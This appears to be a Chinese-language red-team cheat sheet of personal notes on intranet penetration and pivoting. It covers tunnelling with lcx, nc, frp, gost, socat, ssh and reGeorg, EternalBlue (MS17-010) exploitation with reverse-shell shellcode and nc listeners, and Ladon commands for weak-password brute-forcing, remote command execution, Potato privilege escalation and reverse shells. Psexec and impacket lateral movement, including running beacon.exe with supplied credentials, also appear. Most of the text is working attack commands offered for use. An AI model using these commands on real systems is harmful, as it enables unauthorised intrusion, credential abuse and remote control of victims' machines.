https://gitee.com/windyjxx/projects

## 信息收集
[ENScan_GO | 剑指HW/SRC，解决在HW/SRC场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)


## 内网穿透
[干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
[不同中间件端口复用代理解决方案](https://9bie.org/index.php/archives/969/)
[Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
frp/nps

[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)

-- for xp/2003
3proxy 7.x / CCProxy
nc
[lcx](https://github.com/UndefinedIdentifier/LCX)

[内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
[内网渗透之主机出网OR不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)


边界代理
* 代理类别：HTTP代理、socks代理、telnet代理、ssl代理
* 代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)

### lcx
```bash
# 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt 
lcx.exe -tran 1234 192.168.10.10 3389

# 反向转发
# 示例1 kali机以Win7为跳板机登录Win10
## Win7上执行: 将9000 转发到 9001
## lcx.exe -listen SourcePort  TargetPort
lcx.exe -listen 9000 9001

## 将win10 3389 转发到 Win7: 9000 端口，在Win10上执行：
## lcx.exe -slave RemoteHost RemotePort LocalHost LocalPort
lcx.exe -slave 192.168.10.10 9000 127.0.0.1 3389

## kali连接9001：
rdesktop 192.168.10.10:9001
```
### nc
[nc端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)
```bash
# 跳板机: 8888 转到 153 的 22端口上
nc -l -p 8888 -c "nc 192.168.19.153 22"
```

自动循环连接
```bash
while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
```
### 17-010: AutoBlue-MS17-010
[​MS17010打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)

常用 
```sh
Ladon.exe 192.168.50.153 MS17010
fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
# "1qaz@WSX!@#4"
# 3. https://www.freebuf.com/vuls/356052.html
```

```shell
./shell_prep.sh

# 普通反弹shell, 成功率较高
LHOST for reverse connection:
192.168.183.231
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
1234
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1

## 攻击机
nc -lvvp 1234

## 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64.bin
## 如果是meterpreter, 要用sc_x64_msf.bin, 成功率不高
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64_msf.bin
```

```shell
# server2003_win xp 
python2 checker.py ip 
python2 zzz_exploit.py ip 

# server2008_win7 
x86 推荐使用 
python2 eternalblue_exploit7.py ip shellcode/msfexecx86.bin 
# x64 推荐使用 
python2 eternalblue_exploit7.py ip shellcode/sc_all.bin

# server2012_win8.1+ 
python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
```
### Ladon
[Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)

检测
```shell
Ladon 192.168.1.8 MS17010
Ladon 192.168.1.8/24 MS17010
Ladon 192.168.1.8/c MS17010
Ladon 192.168.1.50-192.168.1.200 ICMP
Ladon ip24.txt ICMP
Ladon 192.168.1.8 WhatCMS # 扫描IP
Ladon noping 192.168.1.8 WhatCMS # 扫描IP 禁PING扫描
```

正向代理Socks5
```shell
Ladon Socks5 192.168.1.8 1080
```

使用 proxifier 代理扫描, 代理工具不支持ICMP，必须加noping

```sh
Ladon noping 10.1.2.8/24 MS17010
```

[密码爆破](http://k8gege.org/Ladon/sshscan.html)

```shell
# 扫描C段445端口Windows机器弱口令
Ladon 192.168.1.8/24 SmbScan
Ladon 192.168.1.8/24 SshScan
Ladon 192.168.1.8/24 FtpScan
Ladon 192.168.1.8/24 MysqlScan
# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 OracleScan

# 扫描C段27017端口MongoDB服务器弱口令
Ladon 192.168.1.8/24 MongodbScan

# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 SqlplusScan

# 扫描C段5985端口Winrm服务器弱口令
Ladon 192.168.1.8/24 WinrmScan
Ladon 192.168.1.8/24 RedisScan

# 扫描C段8728端口RouterOS路由器
Ladon 192.168.1.8/24 RouterOSScan
```
5、远程命令执行
```shell
Ladon SshCmd host port user pass cmd
Ladon WinrmCmd host port user pass cmd
Ladon PhpShell url pass cmd
Ladon PhpStudyDoor url cmd
```

Potato 提权
```shell
Ladon SweetPotato whoami # win7,2012r2
Ladon SweetPotato shell.exe
Ladon badpotato # win8
```

[反弹shell](http://k8gege.org/Ladon/ReverseShell.html)
```shell
# 反弹 NC shell
Ladon ReverseTcp 192.168.1.8 4444 nc
# 反弹MSF TCP Shell
Ladon ReverseTcp 192.168.1.8 4444 shell
# 反弹MSF TCP Meter
Ladon ReverseTcp 192.168.1.8 4444 meter
```

# proxy
## proxychains

只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉

## frp
[神兵利器 | Frp搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)


* 常规方式

1. 攻击机 kali: 192.168.50.80 启监听 `./frps` 或配置
```conf
[common]
bind_addr = 0.0.0.0
bind_port = 7000
```

2. 拿到靶机后 Debian启动  `frpc -c frpc.ini` ，配置文件如下：
```conf
[common]
server_addr = 192.168.53.132  
server_port = 7000          
[socks5]
type = tcp
remote_port = 8989
plugin = socks5
```
3.可使用代理 192.168.50.80:8989

* 其他使用 frpc
```shell
frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
# 相当于
[common]
server_addr = 127.0.0.1
server_port = 7000

[tcp1]
type = tcp
local_ip = 127.0.0.1
local_port = 1234
remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
```


## goproxy

```shell
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon

# 二级代理HTTP: 使用本地端口8090，假设上级HTTP代理是22.22.22.22:8080
proxy http -t tcp -p "0.0.0.0:8090" -T tcp -P "22.22.22.22:8080"

# 一级TCP: 本地33080端口就是访问192.168.22.33的22端口。
proxy tcp -p ":33080" -T tcp -P "192.168.22.33:22"
# 二级TCP: 本地23080端口就是访问22.22.22.33的8080端口。
## VPS(IP:22.22.22.33)执行:
proxy tcp -p ":33080" -T tcp -P "127.0.0.1:8080"
## 本地执行:
proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"

```
## ssh

![](https://s2.loli.net/2022/12/31/vdz5bXjOt368sHW.png)
![](https://s2.loli.net/2022/12/31/OVPkim34YNj5Wwy.png)

```sh
ssh -L localport:remotehost:remotehostport sshserver
```

| Label          | Desc                                                      |
| -------------- | --------------------------------------------------------- |
| localport      | 本机开启的端口号                                          |
| remotehost     | 连接机器的IP地址                                          |
| remotehostport | 转发机器的端口号                                          |
| sshserver      | 转发机器的IP地址                                          |
| Options        |                                                           |
| -L             | 表示Local Port Forwarding，即本地端口转发                 |
| -f             | 后台启用                                                  |
| -N             | 不打开远程shell，处于等待状态(不加-N则会进入分配的命令行) |
| -g             | 启用网关功能                                              |

1.SSH远程端口转发
```shell
# 示例1
useradd tunneluser -m -d/home/tunneluser -s/bin/true
passwd tunneluser
ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发到 内网 3.3.3.3:3389
## 攻击者
attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd


# 示例2 将A:6666 转发为 B->C:80
# B:192.168.0.106 C:10.10.10.154
ssh -fN -L 本地端口:目标IP:目标端口   root@192.168.0.106
ssh -fN -L 6666:10.10.10.154:80 root@192.168.0.106
# 解析:A在本地访问自己的6666端口，就相当于通过B访问C的80端口
# 即通过B将C的80端口转发到本地6666端口
```

![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)

2.SSH本地端口转发
适用不出网机器, 允许我们从通常无法连接回我们的主机运行反向shell

从attacker-pc转发80并从PC-1使其可用
```shell
# 格式: ssh -N -L *:local_port:127.0.0.1:server_port tunne1user@1.1.1.1 
# pc-1:2.2.2.2, 将pc-1:80 转发到 1.1.1.1,  访问 pc-1:80相当于访问 1.1.1.1:80
PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

示例2 开启代理, 通过代理的所有命令从192.168.50.161执行
```shell
# 示例 2, -p 指服务器 ssh的端口, 通过
ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
```

3. 动态端口转和sock
如果目标没有ssh服务器, 以下命令开启代理
```shell
PC-1$ ssh tunneluser@1.1.1.1 -R 9050 -N
# 配合proxychians
socks4 127.0.0.1 9050
```

| Args | Desc                             |
| ---- | -------------------------------- |
| -f   | 后台运行                         |
| -N   | 不执行远程命令，只进行端口转发   |
| -D   | SOCKS 代理的端口                 |

## socat 端口转发

有时不行换frp
```shell
# 本地 1234 转发到 远程 4321
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
# 本地 822 转发到 本地 8080
socat TCP4-LISTEN:822,fork TCP4::8080
```

[SSH+socat](https://blog.51cto.com/u_14028678/3847755)
```shell
# ssh -1080 本地1080 转发到 192.168.0.154
# 本地的 445端口数据通过sock代理转发到10.10.10.129的445端口上。
ssh -D 1080 user@192.168.175.146
socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
# socat->sock默认端口就是 1080 ，使用其他端口要在最后指定 socksport=<port>
```

![](https://s2.51cto.com/images/blog/202109/10/944febf3e0d057a36652ad7fba9f3e09.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184)

该选项允许 socat为收到的每个连接分叉一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包括它，socat 将在第一个连接完成后关闭。 fork
回到我们的示例，如果我们想使用 PC-1 作为透视访问服务器上的端口 3389，就像我们对 SSH 远程端口转发所做的那样，我们可以使用以下命令

```shell
# 将 3.3.3.3:3389 挂载到 localhost:3389
PC-1$ socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```
请注意，socat 不能像SSH那样将连接直接转发到攻击者的计算机，但会在PC-1上打开一个端口，然后攻击者的计算机可以连接到该端口:

![](https://s2.loli.net/2023/01/01/1m9HgVTQbzJRjYW.png)

```shell
# 开防火墙 3389 端口
PC-1$ netsh advfirewall firewall localport=3389 add rule name="Open Port 3389" dir=in action=allow protacol=TCP
# 将 1.1.1.1:80服务 挂载到 localhost:80
PC-1$ socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

## gost 端口转发 -- 很全面
[Link](https://blog.csdn.net/zzlufida/article/details/82972053) 
[doc v2](https://v2.gost.run/configuration/)
[doc v3](https://latest.gost.run/)



__端口转发:__
将 1.1.1.1:9000 转发到 2.2.2.2:8080
PC1: 1.1.1.1
PC2: 2.2.2.2

```shell
# 创建代理
PC-1$ gost -L socks5://:2080
# 访问 1.1.1.1:9000 显示 2.2.2.2:8080
PC-2$ gost -L=rtcp://:9000/:8080 -F=socks5://1.1.1.1:2080
PC-2$ gost -L=rtcp://:9000/127.0.0.1:8080 -F=socks5://1.1.1.1:2080
# 转发多个端口
PC-2$ gost -L=rtcp://:9001/:8081 -L=rtcp://:9000/:8080 -F=socks5://192.168.50.232:2080


# 本地端口转发, 可转成走代理的端口
gost -L=tcp://:1234/192.168.50.80:8000 # 1234端口转发到 192.168.50.80:8000
gost -L=tcp://:2222/192.168.1.1:22 [-F=...]
```

代理模式
```shell
# 默认是 http+socks5
gost -L=:8080
# 将 socks4 转成 http/socks5
gost -L=:8080 -F=socks4://192.168.50.161:43848
```

## pystinger 仅web服务权限不出网使用
[Link](https://cloud.tencent.com/developer/article/2036092) 

假设不出网服务器域名为 http://example.com:8080 ,服务器内网IP地址为192.168.3.11

SOCK4代理
```
1. proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8
2. 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端
       不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
3. vps执行./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000
此时已经在vps127.0.0.1:60000启动了一个example.com所在内网的socks4a代理
此时已经将目标服务器的127.0.0.1:60020映射到vps的127.0.0.1:60020

...

```

## tocks
apt-get install tsocks  
vi /etc/tsocks.conf  

```shell
local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络  
local = 127.0.0.0/255.0.0.0  
server = 127.0.0.1   #socks服务器的IP  
server_type = 5  #socks服务版本  
server_port = 8888  # socks服务使用的端口  
```

run
```shell
tsocks curl http://myexternalip.com &
```
## regeorg
pip install安装

上传php到服务器
```sh
python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口

vi /etc/proxychains.conf
# 添加
socks5 127.0.0.1 本地监听端口
:wq

proxychains 命令
```


## SoftEther VPN内网穿透
[SoftEther VPN内网穿透](https://mp.weixin.qq.com/s/Xim1SKnU41Z_rb9aI0QdDA)

# 远程桌面
xfreerdp
## remmina

socks5代理
```shell
vi ~/.local/share/remmina/xxx.remmina
proxy_hostname=192.168.50.161
proxy_type=socks5
proxy_port=2080
# http代理
http_proxy=http://username:password@proxyserver.net:port/
http_proxy=http://192.168.50.161:2080/
```
## rustdesk 多平台/支持内网点对点
[Link](https://github.com/rustdesk/rustdesk/releases)

允许IP: ID右侧三个点 -> 允许IP直连


# other

## linpeas

```sh
./linpeas.sh | tee linlog.txt
```

## keystore,keytool,ssl证书解密pcap

```shell
keytool -list -keystore c:\keystore # 输入密钥库口令tomcat
# 从密钥库导出.p12证书，将keystore拷贝到keytool目录，导出名为：tomcatkeystore.p12的证书，命令：
keytool -importkeystore -srckeystore c:\keystore -destkeystore c:\tomcatkeystore.p12 -deststoretype PKCS12 -srcalias tomcat

# 将.p12证书导入Wireshark
# 在Wireshark中打开 .pcap, 菜单: 编辑–首选项–Protocols–SSL，点击右边的Edit：输入：192.168.110.140 8443 http 点击选择证书文件 输入密码tomcat
```

## 向日葵_识别码和验证码提取工具

https://github.com/wafinfo/Sunflower_get_Password

# Domain/域
## psexec
```bat
psexec \\ip -u administrator -p admin cmd  进⼊半交互式shell
psexec -accepteula \\192.168.108.101 -s cmd.exe 建立交互的shell
psexec \\ip - uadministrator -p admin -w c:\cmd 进⼊交互式shell，且c:\是⽬标机器的⼯作⽬录
psexec \\ip -u administrator -p admin whoami all 执行命令
psexec \\ip -u administrator -p admin -d c:\beacon.exe 执行文件
psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC的⽤⼾权限执行文件
```
## impacket


```sh
# 注意前缀本例是域名 god/
# 1.命令行
python psexec.py god/administrator:hongrisec@2019@192.168.52.143
python smbexec.py god/administrator:hongrisec@2019@192.168.52.143 
# 1.1 msf msf_psexec.rc
# 2.执行命令
python psexec.py god/administrator:hongrisec@2019@192.168.52.143 ipconfig
```

## mstsc
```bat
:: 1个服务器只能保留一个凭据
cmdkey /generic:"TERMSRV/192.168.50.153" /user:"admin" /pass:"123456"
cmdkey /generic:"192.168.50.153" /user:"admin" /pass:"123456"
mstsc /admin /v:192.168.50.153:33089
```